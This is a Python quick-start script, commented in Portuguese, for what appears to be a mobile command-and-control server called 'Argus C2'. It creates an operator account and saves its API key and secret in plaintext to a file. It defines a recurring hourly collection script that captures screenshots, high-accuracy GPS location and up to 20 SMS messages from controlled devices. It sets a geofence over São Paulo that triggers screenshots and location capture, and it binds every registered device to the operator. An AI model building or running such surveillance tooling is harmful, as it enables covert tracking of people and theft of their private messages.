#!/usr/bin/env python3
"""
Quick Start Script - Argus C2 Military Features
Cria operador, campanha e configurações iniciais automaticamente
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from flask import Flask
from config import get_config
from database.backend.database_manager import DatabaseManager, db
from database.backend.models import Device
from database.backend.models_military import Operator, Campaign
from backend.military.military_manager import MilitaryManager

def setup_military_features():
    """
    Configura funcionalidades militares com dados de exemplo
    """
    
    # Criar aplicação Flask
    app = Flask(__name__)
    config = get_config()
    app.config.from_object(config)
    config.init_app(app)
    
    # Inicializar database
    db_manager = DatabaseManager(app)
    military_manager = MilitaryManager(app)
    
    with app.app_context():
        # Criar tabelas
        print("📊 Criando tabelas do banco de dados...")
        db_manager.create_tables()
        
        # Verificar se já existe operador
        existing_operator = Operator.query.first()
        if existing_operator:
            print("✅ Operadores já existem. Pulando configuração inicial.")
            print(f"   Operador: {existing_operator.name} ({existing_operator.code_name})")
            return
        
        print("\n🎖️ Configurando funcionalidades militares...")
        print("=" * 60)
        
        # 1. Criar operador padrão
        print("\n1️⃣ Criando operador padrão...")
        operator = military_manager.create_operator(
            name="Operador Principal",
            code_name="ALPHA-001",
            organization="Argus Command",
            permission_level=4,  # Admin
            max_devices=1000
        )
        
        print(f"   ✅ Operador criado: {operator.name}")
        print(f"   📝 Code Name: {operator.code_name}")
        print(f"   🔑 API Key: {operator.api_key}")
        print(f"   🔐 API Secret: {operator.api_secret_plain}")
        print("\n   ⚠️  IMPORTANTE: Salve estas credenciais!")
        
        # Salvar credenciais em arquivo
        with open('operator_credentials.txt', 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("ARGUS C2 - CREDENCIAIS DO OPERADOR\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Operador: {operator.name}\n")
            f.write(f"Code Name: {operator.code_name}\n")
            f.write(f"Organization: {operator.organization}\n")
            f.write(f"Permission Level: {operator.permission_level}\n\n")
            f.write(f"API Key: {operator.api_key}\n")
            f.write(f"API Secret: {operator.api_secret_plain}\n\n")
            f.write("⚠️ Mantenha estas credenciais em local seguro!\n")
            f.write("=" * 60 + "\n")
        
        print(f"   💾 Credenciais salvas em: operator_credentials.txt")
        
        # 2. Criar campanha de exemplo
        print("\n2️⃣ Criando campanha de exemplo...")
        campaign = military_manager.create_campaign(
            operator_id=operator.id,
            name="Campanha Demonstração",
            code_name="DEMO-2024",
            description="Campanha de demonstração das funcionalidades militares",
            priority="normal"
        )
        
        print(f"   ✅ Campanha criada: {campaign.name}")
        print(f"   📝 Code Name: {campaign.code_name}")
        
        # 3. Criar script de exemplo
        print("\n3️⃣ Criando script de coleta de exemplo...")
        
        script_steps = [
            {
                "step": 1,
                "command": "screenshot",
                "data": {},
                "delay": 0
            },
            {
                "step": 2,
                "command": "wait",
                "seconds": 60
            },
            {
                "step": 3,
                "command": "location",
                "data": {"accuracy": "high"},
                "delay": 0
            },
            {
                "step": 4,
                "command": "sms_dump",
                "data": {"limit": 20},
                "delay": 5
            }
        ]
        
        script = military_manager.create_command_script(
            name="Coleta Básica",
            script_steps=script_steps,
            campaign_id=campaign.id,
            description="Script básico: Screenshot + GPS + SMS",
            repeat_count=0,  # Infinito
            repeat_interval=3600  # 1 hora
        )
        
        print(f"   ✅ Script criado: {script.name}")
        print(f"   📝 Steps: {len(script.script_steps)}")
        print(f"   🔄 Repetição: A cada 1 hora")
        
        # 4. Criar geo-fence de exemplo
        print("\n4️⃣ Criando geo-fence de exemplo...")
        
        # Coordenadas: São Paulo, Brasil (exemplo)
        geofence = military_manager.create_geofence(
            name="Zona de Demonstração",
            center_lat=-23.550520,
            center_lon=-46.633308,
            radius_meters=1000,
            campaign_id=campaign.id,
            trigger_on_enter=True,
            trigger_on_exit=False,
            action_commands=[
                {"command": "screenshot"},
                {"command": "location", "data": {"accuracy": "high"}}
            ]
        )
        
        print(f"   ✅ Geo-fence criada: {geofence.name}")
        print(f"   📍 Centro: {geofence.center_latitude}, {geofence.center_longitude}")
        print(f"   📏 Raio: {geofence.radius_meters}m")
        
        # 5. Associar dispositivos existentes ao operador (se houver)
        print("\n5️⃣ Verificando dispositivos existentes...")
        devices = Device.query.all()
        
        if devices:
            print(f"   📱 {len(devices)} dispositivo(s) encontrado(s)")
            for device in devices:
                device.operator_id = operator.id
            db.session.commit()
            print(f"   ✅ Dispositivos associados ao operador")
        else:
            print(f"   ℹ️  Nenhum dispositivo registrado ainda")
        
        print("\n" + "=" * 60)
        print("✅ CONFIGURAÇÃO CONCLUÍDA COM SUCESSO!")
        print("=" * 60)
        
        print("\n📋 PRÓXIMOS PASSOS:")
        print("   1. Inicie o servidor: python server_integrated.py")
        print("   2. Acesse o mapa: http://localhost:5000/api/military/map")
        print("   3. Consulte a documentação: README_MILITARY.md")
        print("   4. Use as credenciais salvas em: operator_credentials.txt")
        
        print("\n🎯 ENDPOINTS PRINCIPAIS:")
        print("   - Mapa em Tempo Real: /api/military/map")
        print("   - Operadores: /api/military/operators")
        print("   - Campanhas: /api/military/campaigns")
        print("   - Scripts: /api/military/scripts")
        print("   - Geo-Fences: /api/military/geofences")
        print("   - Intelligence: /api/military/intelligence")
        print("   - Analytics: /api/military/analytics/dashboard")
        print("   - Prometheus: /api/military/analytics/export/prometheus")
        
        print("\n")

if __name__ == '__main__':
    print("\n🎖️ ARGUS C2 - CONFIGURAÇÃO MILITAR")
    print("=" * 60)
    
    try:
        setup_military_features()
    except Exception as e:
        print(f"\n❌ ERRO: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

